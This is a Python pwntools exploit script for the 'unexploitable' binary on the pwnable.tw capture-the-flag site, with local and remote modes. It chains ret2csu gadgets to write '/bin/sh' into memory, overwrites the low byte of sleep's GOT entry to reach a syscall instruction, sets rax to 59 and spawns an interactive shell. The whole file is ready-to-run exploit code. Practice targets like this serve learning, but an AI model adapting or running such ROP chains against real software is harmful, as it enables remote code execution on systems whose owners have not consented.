from pwn import *
import sys

elf = ELF("unexploitable")
buff_binsh = 0x601100
buff_store_59_chars = 0x601a00
csu_init_1 = 0x4005E6
csu_init_2 = 0x4005D0
read_got = elf.got["read"]
sleep_got = elf.got["sleep"]
main = 0x400544
leave_ret = 0x400576 

if sys.argv[1] == "l":
    p = process("./unexploitable_local", env={"LD_PRELOAD":"libc-2.23.so"}, aslr=True)
    libc = ELF("./libc-2.23.so", checksec=False)
    lsb = "\x85"          # lsb of syscall in my local libc   (alarm+5)
    # context.terminal = ["tmux", "splitw", "-h"]
    # gdb.attach(proc.pidof(p)[0], gdbscript="""
    #                                         continue
    #                                         """)
elif sys.argv[1] == "r":
    p = remote("chall.pwnable.tw", 10403)
    libc = ELF("./libc_64.so.6")
    lsb = "\x55"         # lsb of syscall in remote libc (alarm+5)

def ret2csu(address, payload, ret):
    sleep(3)
    payload1 = "A"*16 + p64(0)
    payload1 += p64(csu_init_1)
    payload1 += p64(0)
    payload1 += p64(0)  # rbx
    payload1 += p64(1)  # rbp
    payload1 += p64(read_got)  # call r12
    payload1 += p64(0) # r13d -> edi
    payload1 += p64(address) # r14 -> rsi
    payload1 += p64(len(payload))  # r15->rdx
    payload1 += p64(csu_init_2)
    payload1 += p64(0)*7
    payload1 += p64(ret)
    p.send(payload1)
    sleep(3)
    p.send(payload)

def solve():
    # ret2csu: write binsh to bss
    ret2csu(buff_binsh, "/bin/sh\x00", main)

    # ret2csu: write lsb of sleep_got to syscall address
    ret2csu(sleep_got, lsb, main)
    
    # read 59 bytes to a blank buffer => rax = 0x3b. 
    payload = "A"*16 + p64(0)
    payload += p64(csu_init_1)
    payload += p64(0)
    payload += p64(0)  # rbx
    payload += p64(1)  # rbp
    payload += p64(read_got)  # call r12
    payload += p64(0) # r13d -> edi
    payload += p64(buff_store_59_chars) # r14 -> rsi
    payload += p64(59)  # r15->rdx
    payload += p64(csu_init_2)
    payload += p64(0)*7
    # Now rax=0x3b => ret2csu again to setup registers for system("/bin/sh")
    # target:
    # rsi = rdx = NULL
    # rdi = buff_binsh
    # call syscall
    payload += p64(csu_init_1)
    payload += p64(0)
    payload += p64(0)  # rbx
    payload += p64(1)  # rbp
    payload += p64(sleep_got)  # call r12
    payload += p64(buff_binsh) # r13d -> edi
    payload += p64(0) # r14 -> rsi
    payload += p64(0)  # r15->rdx
    payload += p64(csu_init_2)

    sleep(3)
    p.send(payload)         # send payload to setup rax, rdi, rsi, rdx and call syscall
    sleep(3)
    p.send("Z"*59)          # modify rax=59
    p.interactive()


if __name__ == "__main__":
    solve()
                            